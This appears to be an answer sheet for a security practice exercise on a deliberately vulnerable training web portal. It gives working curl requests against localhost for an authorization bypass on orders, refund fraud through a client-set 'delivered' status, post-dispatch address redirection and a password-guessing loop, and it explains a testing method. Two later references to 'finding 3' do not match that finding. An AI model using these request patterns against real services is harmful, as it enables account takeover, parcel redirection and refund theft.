# What's wrong with this app, and how to find it

A practice sheet for the Northwind portal. **Read this only after you've tried hunting
yourself** — it gives away every answer.

Every result below was reproduced against the running app, not guessed from reading the code.
Set-up for all of it:

```bash
npm start
TOKEN_A=$(curl -s -X POST http://127.0.0.1:3000/login -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice-pass-123"}' | python -c "import sys,json;print(json.load(sys.stdin)['token'])")
TOKEN_B=$(curl -s -X POST http://127.0.0.1:3000/login -H 'Content-Type: application/json' \
  -d '{"username":"bob","password":"bob-pass-456"}' | python -c "import sys,json;print(json.load(sys.stdin)['token'])")
```

Alice owns orders 995, 996, 998, 999, 1001, 1002. Bob owns 994, 997, 1000, 1003.

---

## 1. Broken object level authorization — High

**The one bug planted on purpose.** `GET /orders/:id` and `PUT /orders/:id` check that you're
signed in, then never check the order is yours.

```bash
curl -s http://127.0.0.1:3000/orders/1003 -H "Authorization: Bearer $TOKEN_A"
```
Alice gets Bob's order and his home address. Then take it over:
```bash
curl -s -X PUT http://127.0.0.1:3000/orders/1003 -H "Authorization: Bearer $TOKEN_A" \
  -H 'Content-Type: application/json' \
  -d '{"status":"cancelled","shippingAddress":"attacker address"}'
```
`200`. Bob's order is cancelled and re-routed.

**How you'd find it:** list your own orders, note the IDs are sequential integers, then ask
for one you were never shown. Compare `GET /orders` (which filters by owner) against
`GET /orders/:id` (which doesn't) — the inconsistency inside one file is the tell.

**Root cause:** `src/routes/orders.js:45` and `:56` call `findOrderById` with no ownership
comparison. `addresses.js` and `returns.js` both get this right, which is what makes the
omission obvious on review.

---

## 2. Refund fraud through self-assigned order status — High

I did not plant this one. It emerged from the status field being client-writable, and it's
arguably worse than the IDOR because it takes money.

`PUT /orders/:id` lets you set `status` to any value in the allow-list, including `delivered`.
`POST /returns` refunds any order that is `delivered`. Nothing checks that a delivery ever
happened.

Order 998 is a **cancelled** order of Alice's — goods she never received and never paid for:

```bash
curl -s -X PUT http://127.0.0.1:3000/orders/998 -H "Authorization: Bearer $TOKEN_A" \
  -H 'Content-Type: application/json' -d '{"status":"delivered"}'

curl -s -X POST http://127.0.0.1:3000/returns -H "Authorization: Bearer $TOKEN_A" \
  -H 'Content-Type: application/json' -d '{"orderId":998,"reason":"never arrived"}'
```
`201`, refund amount **$106.92**, on a cancelled order.

**How you'd find it:** list every field a request lets you write, then ask which of them the
business logic later trusts. `status` is written by the client and read as fact by the refund
path. That question — "who is allowed to assert this?" — finds this class of bug generally.

**Fix:** status belongs to fulfilment, not the customer. Drop it from `UPDATABLE_FIELDS` and
let only an internal process move an order to `shipped` or `delivered`.

---

## 3. Shipping address editable after dispatch — Medium

```bash
curl -s -X PUT http://127.0.0.1:3000/orders/1001 -H "Authorization: Bearer $TOKEN_A" \
  -H 'Content-Type: application/json' -d '{"shippingAddress":"redirected"}'
```
Order 1001 is already `shipped` with a UPS tracking number, and the address still changes.
Combined with finding 1, an attacker redirects *other people's* parcels in flight.

**How you'd find it:** for each mutable field, ask when it should become frozen. Anything
writable after the state that depends on it is a finding.

---

## 4. No rate limiting on login — Medium

Twelve wrong passwords in a row, all answered `401`. No lockout, no delay, no CAPTCHA:

```bash
for i in $(seq 1 12); do
  curl -s -o /dev/null -w "%{http_code} " -X POST http://127.0.0.1:3000/login \
    -H 'Content-Type: application/json' -d "{\"username\":\"alice\",\"password\":\"wrong$i\"}"
done
```

**How you'd find it:** Burp Intruder, or the loop above. Watch for a status change, a growing
delay, or a CAPTCHA appearing. None of them happen here.

---

## 5. Sign-out doesn't end the session — Medium

`signOut()` in `public/app.js` only deletes the token from `sessionStorage`. There is no
`POST /logout`, so the server-side entry in `sessions.js` lives on for its full hour.

Sign out in the browser, then reuse the old token:
```bash
curl -s http://127.0.0.1:3000/me -H "Authorization: Bearer $TOKEN_A"
```
Still `200`. A token captured from a shared machine keeps working after the user "logs out".

**How you'd find it:** capture a token, sign out in the UI, replay the token. Always test
whether logout is real or cosmetic.

---

## 6. Passwords stored and compared in plaintext — High in a real system

`src/db.js:19` holds `password: 'alice-pass-123'`, and `auth.js:16` compares with `!==`.
No hashing, and the comparison isn't constant-time.

**How you'd find it:** grep the data layer for `password` and look for `bcrypt`, `argon2` or
`scrypt`. Their absence is the finding.

---

## 7. Missing security hardening — Low, but note it

`grep -rE "helmet|cors|rate-limit|bcrypt" src/ package.json` returns nothing. No security
headers, no CSP, no HSTS, no rate limiting anywhere.

---

## What is *not* broken here

Worth knowing, so you don't report non-issues:

- **No XSS.** Every value from the API reaches the page through `textContent`. The four
  `innerHTML` calls in `public/app.js` all write fixed, internal SVG strings — never user data.
- **No price tampering.** `POST /orders` ignores any price the client sends and recomputes
  totals from the catalogue (`src/routes/orders.js:39`).
- **No mass assignment.** `PUT /orders/:id` copies only the two fields in `UPDATABLE_FIELDS`,
  so `ownerId` and `total` can't be injected.
- **Addresses and returns are correctly scoped.** Both compare `ownerId` to `req.user.id`, so
  the IDOR does not extend to them. Finding 3 above confirms an attacker *cannot* refund
  someone else's order.
- **Tokens are strong.** 24 random bytes from `crypto.randomBytes`, not guessable.

---

## The method, in order

1. **Map the surface.** List every route and what it touches. Here: 7 endpoints, 2 roles.
2. **Find the authorization pattern.** Spot how the app *normally* proves ownership, then look
   for places that skip it. A codebase that gets it right in three files and wrong in one is
   how real bugs look.
3. **Get two accounts.** Almost every access-control bug needs a second user to prove impact.
4. **Set a baseline.** Capture a legitimate request. Change exactly one thing — an ID, a field,
   the method — and compare.
5. **Ask who may assert each field.** That question found finding 2, which code review alone
   tends to miss because each route looks fine on its own.
6. **Chain the small ones.** On its own, writable `status` is low severity. Reaching the refund
   path makes it financial. Severity comes from where a primitive leads.
7. **Prove impact, don't assume it.** Every claim here was run against the app first. Finding 3
   is in the list precisely because testing *disproved* an assumption I had.
